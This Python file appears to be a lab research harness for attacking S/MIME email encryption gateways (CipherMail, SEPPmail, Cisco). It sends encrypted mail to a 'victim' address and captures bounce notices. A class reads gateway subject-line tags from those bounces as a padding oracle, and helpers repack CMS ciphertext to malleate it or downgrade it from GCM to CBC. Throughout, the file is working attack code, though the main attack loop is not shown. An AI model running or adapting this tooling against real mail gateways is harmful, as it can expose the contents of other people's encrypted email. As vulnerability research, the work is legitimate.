"""Harness: bounce capture, openssl encrypt, CMS malleate/downgrade."""

from __future__ import annotations

import random
import uuid
import asyncio
import json
import queue
import smtplib
import subprocess
import tempfile
import time
from email import policy
from email.message import EmailMessage
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
from email.parser import BytesParser, Parser
from email.utils import parseaddr
from pathlib import Path

from aiosmtpd.controller import Controller
from asn1crypto import cms, core
import argparse

# Recipient S/MIME certs for the victim identity, one per profile (ciphermail/seppmail/cisco).
CERTS = Path(__file__).resolve().parent / "certs"

# Victim's email address
BOUNCE_RCPT = "smime1@internal.test"

# Sender of the DSNs
HARNESS_MAILER_FROM = f"MAILER-DAEMON@{BOUNCE_RCPT.rsplit('@', 1)[-1]}"

# IP of the gateway and where the DSN will be sent to, respectively
PROFILES: dict[str, tuple[str, str]] = {
    "ciphermail": ("10.0.2.2", "10.0.2.10"),
    "cisco": ("10.0.2.15", "10.0.2.10"),
    "seppmail": ("192.168.100.2", "192.168.100.10"),
}

AES256_CBC = "2.16.840.1.101.3.4.1.42"
AES256_CFB = "2.16.840.1.101.3.4.1.44"
ENVELOPED = "1.2.840.113549.1.7.3"

def _valid_ipv4(addr: str) -> bool:
    parts = addr.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False


def argparser() -> argparse.ArgumentParser:
    a = argparse.ArgumentParser()
    a.add_argument("profile", choices=list(PROFILES))
    a.add_argument("--trials", type=int, default=1)
    a.add_argument(
        "--target",
        metavar="ADDR",
        help="harness routable IP (SMTP to guest MTA); bind capture on this host's local "
        "address toward ADDR (see ip route get)",
    )
    return a


def _local_ipv4_to(peer: str) -> str | None:
    proc = subprocess.run(
        ["ip", "-4", "route", "get", peer],
        capture_output=True,
        text=True,
        check=False,
    )
    if proc.returncode != 0:
        return None
    toks = proc.stdout.split()
    for i, tok in enumerate(toks):
        if tok == "src" and i + 1 < len(toks) and _valid_ipv4(toks[i + 1]):
            return toks[i + 1]
    return None


def parse_args(parser: argparse.ArgumentParser | None = None) -> argparse.Namespace:
    p = parser if parser is not None else argparser()
    args = p.parse_args()
    if args.target is not None:
        if not _valid_ipv4(args.target):
            p.error(f"invalid --target: {args.target!r}")
        capture_host = _local_ipv4_to(args.target)
        if capture_host is None:
            p.error(f"cannot determine local capture address for --target {args.target!r}")
        for p in PROFILES:
            PROFILES[p] = (args.target, capture_host)
    return args

def xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def cert_pem(profile: str) -> Path:
    return CERTS / f"{profile}.pem"


def _recipient_cert_path(cert: Path) -> Path:
    c = cert.expanduser().resolve()
    if not c.is_file():
        raise FileNotFoundError(f"Recipient certificate missing: {c}")
    return c


def _openssl_der(inner: bytes, mid: list[str], cert: Path) -> bytes:
    cert = _recipient_cert_path(cert)
    with tempfile.NamedTemporaryFile(delete=False, suffix=".eml") as f:
        f.write(inner)
        inp = f.name
    outp = inp + ".der"
    try:
        cmd = ["openssl", *mid, "-in", inp, "-outform", "DER", "-out", outp, str(cert)]
        proc = subprocess.run(cmd, capture_output=True, text=True)
        if proc.returncode != 0:
            err = (proc.stderr or proc.stdout or "").strip()
            raise RuntimeError(
                f"openssl failed ({proc.returncode}): {err}\ncommand: {' '.join(cmd)}"
            )
        return Path(outp).read_bytes()
    finally:
        Path(inp).unlink(missing_ok=True)
        Path(outp).unlink(missing_ok=True)


def _smime_encrypt(cert: Path, inner: bytes) -> bytes:
    return _openssl_der(inner, ["smime", "-encrypt", "-aes256", "-crlfeol", "-binary"], cert)


def _cms_encrypt_gcm(cert: Path, inner: bytes) -> bytes:
    return _openssl_der(inner, ["cms", "-encrypt", "-id-aes256-GCM", "-crlfeol", "-binary"], cert)


def _dsn_rfc822_headers_raw(raw_dsn: bytes) -> bytes | None:
    """Slice message/rfc822 (or text/rfc822-headers) body out of a DSN without MIME parsing."""
    raw_low = raw_dsn.lower()
    for marker in (b"content-type: message/rfc822", b"content-type: text/rfc822-headers"):
        idx = raw_low.find(marker)
        if idx < 0:
            continue
        after = raw_dsn[idx:]
        body_start = None
        if b"\r\n\r\n" in after:
            body_start = after.find(b"\r\n\r\n") + 4
        elif b"\n\n" in after:
            body_start = after.find(b"\n\n") + 2
        else:
            continue
        return after[body_start:]
    return None


def dsn_rfc822_headers(raw_dsn: bytes) -> bytes | None:
    try:
        msg = BytesParser(policy=policy.SMTP).parsebytes(raw_dsn)
    except IndexError:
        return _dsn_rfc822_headers_raw(raw_dsn)
    if not msg.is_multipart():
        return None
    for p in msg.walk():
        if p.get_content_type() == "text/rfc822-headers":
            body = p.get_payload(decode=True)
            assert isinstance(body, bytes)
            return body
        if p.get_content_type() == "message/rfc822":
            children = p.get_payload()
            assert isinstance(children, list) and len(children) == 1
            return bytes(children[0])
    return None


def subject_from_rfc822_headers_blob(hdr_blob: bytes) -> str | None:
    """Return decoded Subject from a text/rfc822-headers payload (header block only)."""
    chunk = hdr_blob.strip()
    if not chunk:
        return None
    msg = BytesParser(policy=policy.SMTP).parsebytes(chunk + b"\r\n\r\n")
    subj = msg.get("Subject")
    if subj is None:
        return None
    s = str(subj).strip()
    return s or None


def inner_eml(body: str, extra: dict[str, str] | None = None) -> bytes:
    m = MIMEText(body, "plain", "us-ascii")
    if extra:
        for k, v in extra.items():
            m[k] = v
    return m.as_bytes()


def wrap_pkcs7(der: bytes, mail_from: str, hdrs: dict[str, str]) -> MIMEApplication:
    app = MIMEApplication(der, "pkcs7-mime", name="smime.p7m")
    app.replace_header(
        "Content-Type",
        'application/pkcs7-mime; name="smime.p7m"; smime-type=enveloped-data',
    )
    app.replace_header("Content-Transfer-Encoding", "base64")
    app["From"] = mail_from
    app["To"] = BOUNCE_RCPT
    for k, v in hdrs.items():
        app[k] = v
    return app


class Sink:
    def __init__(self, host: str) -> None:
        self.q: queue.Queue[bytes] = queue.Queue()
        self._c: Controller | None = None
        self._h = host
        self.go()

    async def handle_DATA(self, server, session, envelope):  # noqa: ANN001
        self.q.put(envelope.content or b"")
        return "250 ok"

    def go(self) -> None:
        h = type("_", (), {"handle_DATA": self.handle_DATA})()
        self._c = Controller(h, hostname=self._h, port=25)
        self._c.start()
        time.sleep(1)

    def stop(self) -> None:
        if self._c:
            self._c.stop()
            self._c = None


def bounce_capture(
    guest_smtp: str, sink: Sink, msg: EmailMessage, sentinel: str
) -> bytes:
    with smtplib.SMTP(guest_smtp, 25, timeout=30) as s:
        s.send_message(msg)
    while True:
        resp = sink.q.get()
        if sentinel in resp:
            return resp

def metrics_json(d: Path, tag: str, **row) -> Path:
    d.mkdir(parents=True, exist_ok=True)
    p = d / f"{tag}-{int(time.time() * 1000)}.json"
    row["end"] = time.time()
    p.write_text(json.dumps(row))
    return p


def attack_timing_metrics(
    total_s: float,
    trial_s: list[float],
    byte_s: list[list[float]] | None,
) -> dict[str, object]:
    metrics: dict[str, object] = {
        "s": total_s,
        "trial_s": trial_s,
    }

    if byte_s is not None:
        if len(byte_s) != len(trial_s):
            raise ValueError("byte_s must match trial_s length")
        metrics["byte_s"] = byte_s

    return metrics


def pack_iv_ct(der: bytes, iv: bytes, ct: bytes, oid: str = None) -> bytes:
    ci = cms.ContentInfo.load(der)
    ed = ci["content"]
    ne = cms.EncryptedContentInfo(
        {
            "content_type": cms.ContentType("data"),
            "content_encryption_algorithm": cms.EncryptionAlgorithm(
                {
                    "algorithm": oid or ed["encrypted_content_info"]["content_encryption_algorithm"]["algorithm"],
                    "parameters": core.OctetString(bytes(iv)),
                }
            ),
            "encrypted_content": core.OctetString(bytes(ct)),
        }
    )
    ned = cms.EnvelopedData(
        {"version": ed["version"], "recipient_infos": ed["recipient_infos"], "encrypted_content_info": ne}
    )
    return cms.ContentInfo({"content_type": cms.ContentType(ENVELOPED), "content": ned}).dump()


B = 16


def blks(x: bytes) -> list[bytes]:
    return [x[i : i + B] for i in range(0, len(x), B)]


def ctr(nonce12: bytes, i1: int) -> bytes:
    assert len(nonce12) == 12
    return nonce12 + (i1 + 1).to_bytes(4, "big")


def gcm_nonce_ct(der: bytes) -> tuple[bytes, bytes]:
    ci = cms.ContentInfo.load(der)
    aec = ci["content"]["auth_encrypted_content_info"]
    n = aec["content_encryption_algorithm"]["parameters"].native["0"]
    blob = aec["encrypted_content"].contents
    return n, blob[:-16]


def cbc_nonce_ct(der: bytes) -> tuple[bytes, bytes]:
    ci = cms.ContentInfo.load(der)
    eci = ci["content"]["encrypted_content_info"]
    return eci["content_encryption_algorithm"]["parameters"].contents, eci["encrypted_content"].contents


class BounceListener:
    def __init__(self) -> None:
        self.needle: bytes | None = None
        self.queue: queue.Queue[EmailMessage] = queue.Queue()

    async def wait_bounce(self) -> EmailMessage:
        return await asyncio.to_thread(self.queue.get)

    async def handle_RCPT(self, server, session, envelope, address, rcpt_options):  # noqa: ANN001
        envelope.rcpt_tos.append(address)
        return "250"

    async def handle_DATA(self, server, session, envelope):  # noqa: ANN001
        raw = envelope.content or b""
        if self.needle is None or self.needle not in raw:
            return "250"
        msg = BytesParser(policy=policy.SMTP).parsebytes(raw)
        _, from_addr = parseaddr(msg.get("From", ""))
        if from_addr.strip().lower() != HARNESS_MAILER_FROM.lower():
            return "250"
        self.queue.put(msg)
        return "250"


class PadOracle:
    """Subject-line padding oracle; profile selects tag string."""

    def __init__(self, profile: str) -> None:
        self.pf = profile
        self.prefix = ""
        self.slot: list[bool | None] = []
        self._slot_queue: queue.Queue[list[bool]] = queue.Queue()

    def reset(self, prefix: str, n: int, needs_all: bool) -> None:
        self.prefix = prefix + " "
        self.slot = [None] * n
        self.needs_all = needs_all
        while True:
            try:
                self._slot_queue.get_nowait()
            except queue.Empty:
                break

    async def handle_RCPT(self, server, session, envelope, address, rcpt_options):  # noqa: ANN001
        envelope.rcpt_tos.append(address)
        return "250"
    
    def _set_slot(self, i: int, val: bool) -> None:
        self.slot[i] = val
        if (val and not self.needs_all) or (None not in self.slot):
            self._slot_queue.put(list(self.slot))

    async def wait_slots(self) -> list[bool]:
        return await asyncio.to_thread(self._slot_queue.get)

    async def handle_DATA(self, server, session, envelope):  # noqa: ANN001
        body = envelope.content or b""
        hdr_blob = dsn_rfc822_headers(body)
        if hdr_blob is not None and self.prefix in (subj := subject_from_rfc822_headers_blob(hdr_blob) or ""):
            rest = subj[subj.find(self.prefix) + len(self.prefix) :].strip()
            marker = {"cisco": "[verified]", "seppmail": "[secure]", "ciphermail": "[decrypted]"}[self.pf]
            self._set_slot(int(rest.split()[0], 16), marker in subj)
        return "250"


def start_oracle(h, host: str) -> Controller:
    c = Controller(h, hostname=host, port=25)
    c.start()
    time.sleep(0.2)
    return c


def secret_code(cert) -> bytes:
    inner = inner_eml("Code: " + uuid.uuid4().hex + "\n")
    return _smime_encrypt(cert, inner)


def secret_code_gcm(cert) -> bytes:
    inner = inner_eml("Code: " + uuid.uuid4().hex + "\n")
    return _cms_encrypt_gcm(cert, inner)


def secret_pin_gcm(cert: Path) -> bytes:
    sec = random.randint(0, 9999)
    inner = inner_eml(f"This is your PIN: {sec:04d}\nDo not share this PIN with anyone.")
    return _cms_encrypt_gcm(cert, inner)
